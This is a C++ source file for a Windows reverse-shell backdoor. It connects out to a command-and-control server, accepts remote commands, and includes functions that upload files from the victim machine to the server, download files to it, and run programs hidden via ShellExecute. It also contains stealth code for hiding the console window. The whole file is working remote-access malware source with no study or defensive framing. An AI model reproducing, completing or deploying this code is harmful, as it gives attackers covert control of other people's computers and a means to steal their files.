//Main headers

#include <WinSock2.h>  // Socket connection
#include <windows.h>	// Used for WinApi calls
#include <ws2tcpip.h>	// TCP-IP connection
#include <stdio.h>		
#include <string.h>
#include <fstream>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
#define LENGTH 1024
// debug headers
#include <iostream>
#include <string>
#include <vector>
using namespace std;
#pragma warning(disable:4996) 
#pragma once



void whoami(char *returnval, int returnsize) {
	
	DWORD bufferlen = 257;
	//std::cout << "Got WHOAMI" << std::endl;
	GetUserName(returnval, &bufferlen);
}


void getSystemInfo(char* returnval, int returnsize) {
	
	SYSTEM_INFO sysInfo;
	// Copy the hardware information to the SYSTEM_INFO structure. 
	GetSystemInfo(&sysInfo);
	sprintf(returnval, "%lu", sysInfo.wProcessorArchitecture);

}


/*void getSubdirs(vector<string>& output, const string& path)
{
	WIN32_FIND_DATA findfiledata;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	char fullpath[MAX_PATH];
	GetFullPathName(path.c_str(), MAX_PATH, fullpath, 0);
	string fp(fullpath);

	hFind = FindFirstFile((LPCSTR)(fp + "\\*").c_str(), &findfiledata);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if ((findfiledata.dwFileAttributes | FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY
				&& (findfiledata.cFileName[0] != '.'))
			{
				output.push_back(findfiledata.cFileName);
			}
		} while (FindNextFile(hFind, &findfiledata) != 0);
	}
}

/// Gets a list of subdirectory and their subdirs under a specified path
/// @param[out] output Empty vector to be filled with result
/// @param[in]  path   Input path, may be a relative path from working dir
/// @param[in]  prependStr String to be pre-appended before each result
///                        for top level path, this should be an empty string
void getSubdirsRecursive(vector<string>& output,
	const string& path,
	const string& prependStr)
{
	vector<string> firstLvl;
	getSubdirs(firstLvl, path);
	for (vector<string>::iterator i = firstLvl.begin();
		i != firstLvl.end(); ++i)
	{
		output.push_back(prependStr + *i);
		getSubdirsRecursive(output,
			path + string("\\") + *i + string("\\"),
			prependStr + *i + string("\\"));
	}
	for (string s : output) {
		cout << s << endl;
	}
}*/

vector<string> read_directory(string folder)
{
	vector<string> names;
	string search_path = folder+ "\\*";
	WIN32_FIND_DATA fd;
	HANDLE hFind = ::FindFirstFile(search_path.c_str(), &fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			// read all (real) files in current folder

			// , delete '!' read other 2 default folder . and ..
			
			//cout << fd.cFileName[0] << endl;
			//cout << FILE_ATTRIBUTE_DIRECTORY << endl;		
			//cout << (fd.dwFileAttributes | FILE_ATTRIBUTE_DIRECTORY) << endl;
			/*if ((fd.dwFileAttributes | FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY 
				&& (fd.cFileName[0] != '.')) 
				names.push_back(fd.cFileName); 
			
			// if fd.dwFileAttributes

		    if(!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
				names.push_back(fd.cFileName);
				*/
			

			if (fd.cFileName[0] != '.') {

				if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) {	// it's a directory if true
					string val = "";
					val = fd.cFileName;
					val += "	<DIR>";
					names.push_back(val);
				}
				if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) {   // it's a file if true
					names.push_back(fd.cFileName);
				}
			}
			
		} while (::FindNextFile(hFind, &fd));
		::FindClose(hFind);
	}
	return names;
}

void getCurrentDirectory(char* returnval, int returnsize) {

	DWORD bufferlen = 257;
	TCHAR tempVar[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, tempVar);
	strcat(returnval, tempVar);
}

void get_ls(char *returnval, int returnsize) {
	
	char current_directory[257] = "";
	getCurrentDirectory(current_directory, 1024);
	string path(current_directory);

	vector<string> result = read_directory(path);
	
	string result_str= "\n";
	for (string str : result) {
		result_str += str;
		result_str += '\n';
	}

	cout << "\n" << result_str.size() << endl;
	
	strcat(returnval, result_str.c_str());
	
}

void get_goal_dir(char* command, char* return_val) {
	char goal_dir[257] = "";

	int j = 0;
	for (int i = 3; i < 1024; i++) {
		if (command[i] != '\0') {
			goal_dir[j++] = command[i];
		}
		else
			break;
	}
	strcat(return_val, goal_dir);
}

void change_directory(char *command, char *return_val, int buff_size) {
	char current_dir[257] = "";
	getCurrentDirectory(current_dir, 1000);
	
	char goal_dir[257] = "";
	
	get_goal_dir(command, goal_dir);
	
	char result[257] = "";
	string result_str = "";
	if (!SetCurrentDirectory(goal_dir)) {
		result_str = "Could not change the directory";
		strcpy(result, result_str.c_str());
	}
	else {
		result_str = "Working directory has changed...";
		strcpy(result, result_str.c_str());
	}

	strcat(return_val, result);
}

SOCKET connect(char *host, int port) {
	SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in addr;									// Windows data struct which contains all the 
	addr.sin_family = AF_INET;							// details about IP family, address etc.
	addr.sin_addr.s_addr = inet_addr(host);				// should be ip address of CnC server
	addr.sin_port = htons(port);						// should be the port of CnC server
	
	if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		closesocket(tcpsock);
		WSACleanup();
		std::cout << "Can't connect" << std::endl;
		::exit(0);
	}
	return tcpsock;
}

void send_file(SOCKET tcp_sock, const char *filename) {
	cout << "Connected..." << endl;
	Sleep(1500);
	char sdbuf[LENGTH];			//1024
	char buffer[256];	
	int n;
	//fgets(buffer, 255);
	//memset(buffer, 0, sizeof(buffer));

	printf("Sending %s to the server...", filename);
	if (FILE* fs2 = fopen(filename, "rb")) {
		cout << "File exists" << endl;
		send(tcp_sock, "T", sizeof(char), 0);

		FILE* fs = fopen(filename, "rb");

		cout << "Filename:" << filename << endl;

		cout << "\nFS contains:" << fs << endl;
		if (fs == NULL)
			printf("Error: File %s is not found...", filename);

		::memset(sdbuf, 0, LENGTH);
		int fs_block_sz;


		while ((fs_block_sz = fread(sdbuf, sizeof(char), LENGTH, fs)) > 0) {
			if (send(tcp_sock, sdbuf, fs_block_sz, 0) < 0) {
				cout << "Error occurred while sending the file..." << endl;
				break;
			}
			else
				cout << "Sending..." << endl;
			::memset(sdbuf, 0, LENGTH);
		}



		//cout << "File has been sent" << endl;
		//Sleep(1000);
		shutdown(tcp_sock, 2);
		closesocket(tcp_sock);
	}
	else {
		send(tcp_sock, "F", sizeof(char), 0);
		cout << "Couldn't open file make sure it exists in the working directory" << endl;
		closesocket(tcp_sock);
	}

	
}

string get_filename(string command) {
	
	return command.substr(command.find(' ') + 1, command.size());
}

void clean_buffer(char* buffer, int buffer_size, char* commandReceived, int cmd_size) {
	memset(buffer, 0, buffer_size);
	memset(commandReceived, 0, cmd_size);
}

bool contains_cmd(string cmd, string word) {

	for (int i = 0; i < word.length(); i++)
		if (cmd[i] != word[i])
			return false;

	return true;
}

void get_file(SOCKET tr_sock, const char* filename) {
	
	cout << "Conected" << endl;
	Sleep(1500);

	char rcvbuf[LENGTH];

	fstream file;
	file.open(filename, ios::out);

	if (!file) {
		send(tr_sock, "F", sizeof(char), 0);
	}

	FILE* fr = fopen(filename, "wb");
	if (fr != NULL) {
		send(tr_sock, "T", sizeof(char), 0);

		memset(rcvbuf, 0, LENGTH);

		int fr_block_size = 0;
		while ((fr_block_size = recv(tr_sock, rcvbuf, LENGTH, 0)) > 0) {
			int wrt_size = fwrite(rcvbuf, sizeof(char), fr_block_size, fr);
			if (wrt_size < fr_block_size) {
				cout << "Failed to write to file" << endl;
			}
			if (fr_block_size != 1024) {
				break;
			}
		}
		if (fr_block_size < 0) {
			cout << "Failed to receive..." << endl;
 		}

		printf("File received...");
		fclose(fr);
	}

}

void mkdir(char* buffer, const char* file_name) {
	CreateDirectory(file_name, NULL);

	strcat(buffer, "[*] Directory is created...");
}

void exec(char* return_val, const char* command) {

	if (32 >= (int)(ShellExecute(NULL, "open", command, NULL, NULL, SW_HIDE))){
		strcat(return_val, "[-] Couldn't execute the command...");
	}
	else {
		strcat(return_val, "\n[*] Executed...");
	}
}

void revShell() {

	WSADATA wsaver;						
	WSAStartup(MAKEWORD(2, 2), &wsaver);
	
	int tr_port = 8001;		// transfer port			
	
	char host[30] = "127.0.0.1";
	int port = 8080;
	SOCKET tcpsock = connect(host, port);
	
	std::cout << "[+] Connected to client. Waiting for incoming command..." << std::endl;

	char commandReceived[DEFAULT_BUFLEN] = "";
	char buffer[5000] = "";

	while (true) {

		clean_buffer(buffer, 5000, commandReceived, DEFAULT_BUFLEN);

		int result = recv(tcpsock, commandReceived, DEFAULT_BUFLEN, 0); // result = length of command
		std::cout << commandReceived << std::endl;
						
		string command_str(commandReceived);
		cout <<"Received command str: " << commandReceived << endl;

		if (strcmp(commandReceived, "Check") != 0) {

		//if(command_str.find("Check") == string::npos){
			int m = 0;
			if (strcmp(commandReceived, "whoami") == 0) {
				std::cout << "Command parsed: whoami" << std::endl;
				//std::cout << "Length of received command: " << result << std::endl;

				//char buffer[257] = "";

				whoami(buffer, 5000);
			}
			else if (strcmp(commandReceived, "pwd") == 0) {
				std::cout << "Command parsed: pwd" << std::endl;
				getCurrentDirectory(buffer, 5000);
				//std::cout << "Length of received command: " << result << std::endl;
				//getCureentDirectory();
			}
			else if (contains_cmd(command_str, "cd")) {
				std:cout << "Command parsed: cd" << std::endl;
				change_directory(commandReceived, buffer, 5000);
			}
				
			else if (contains_cmd(command_str, "cp")) {
				std::cout << "Command parsed: cp" << std::endl;

				string filename = get_filename(command_str);
				
				send_file(connect(host, tr_port), filename.c_str());
				continue;
			}
			else if (contains_cmd(command_str, "send")) {
				std::cout << "Command parsed: send" << std::endl;

				string filename = get_filename(command_str);
				cout << filename << endl;

				get_file(connect(host, tr_port), filename.c_str());
				continue;
			}

			else if (strcmp(commandReceived, "exit") == 0) {
				std::cout << "Command parsed: exit" << std::endl;
				strcat(buffer, "Exiting...");
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer) + 1, 0);
				memset(buffer, 0, sizeof(buffer));
				memset(commandReceived, 0, sizeof(commandReceived));
				closesocket(tcpsock);
				WSACleanup();
				::exit(0);
			}
			else if (strcmp(commandReceived, "sysinfo") == 0) {
				std::cout << "Command parsed: sysinfo" << std::endl;
				getSystemInfo(buffer, 1000);
			}
			else if (strcmp(commandReceived, "ls") == 0) {
				cout << "Command parsed: ls" << endl;
					
				get_ls(buffer, 5000);

				cout << buffer << endl;
					
			}
			else if (contains_cmd(commandReceived, "mkdir")) {
				cout << "Command parsed: mkdir" << endl;
				string file_name = get_filename(command_str);
				mkdir(buffer, file_name.c_str());
			}
			else if (contains_cmd(commandReceived, "execute")) {
				cout << "Command parsed: execute" << endl;
				string exe_cmd = command_str.substr(command_str.find(' ') + 1, command_str.length());

				exec(buffer, exe_cmd.c_str());
			}
				
			else if (strcmp(commandReceived, "") == 0) {
				closesocket(tcpsock);
				::exit(0);
			}

			else {
				cout << commandReceived << endl;
				strcat(buffer, "Command Not Found..\n");
				std::cout << buffer << std::endl;
			}

			strcat(buffer, "\n");
			send(tcpsock, buffer, strlen(buffer) + 1, 0);
			
		}
		
	}

	closesocket(tcpsock);
	WSACleanup();
	::exit(0);
}

// Main function

std::string execute_cmd() {
    system("powershell ls > temp.txt");
 
    std::ifstream ifs("temp.txt");
    std::string ret{ std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>() };
    ifs.close(); // must close the inout stream so the file can be cleaned up
    if (std::remove("temp.txt") != 0) {
        perror("Error deleting temporary file");
    }
    return ret;
}

int main() {
	//string ret = execute_cmd();
	//cout << ret << endl;
	//system("powershell ls");
	HWND stealth;		// declare a windows handle
	AllocConsole();		// allocate a new console
	stealth = FindWindowA("ConsoleWindowClass", NULL);	// Find the previous Window handler and hide/show the 
	// window depending upon the next command
	ShowWindow(stealth, SW_SHOWNORMAL); // SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = hide the console

	revShell();
	return 0;
}

